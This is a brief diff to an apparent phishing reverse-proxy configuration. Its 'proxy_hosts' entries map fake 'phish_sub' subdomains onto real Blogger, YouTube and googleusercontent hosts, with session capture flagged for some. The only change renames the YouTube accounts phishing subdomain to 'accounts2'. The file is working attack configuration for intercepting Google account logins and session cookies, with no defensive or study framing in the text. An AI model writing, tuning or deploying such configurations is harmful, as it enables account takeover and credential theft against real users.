@@ -26,7 +26,7 @@ proxy_hosts:
   - {phish_sub: 'blogger', orig_sub: 'accounts', domain: 'blogger.com', session: true, is_landing: false}
   - {phish_sub: 'www3', orig_sub: 'www', domain: 'blogger.com', session: true, is_landing: false}
 
-  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'youtube.com', session: false, is_landing: false}
+  - {phish_sub: 'accounts2', orig_sub: 'accounts', domain: 'youtube.com', session: false, is_landing: false}
 
   - {phish_sub: 'lh3', orig_sub: 'lh3', domain: 'googleusercontent.com', session: false, is_landing: false}
 
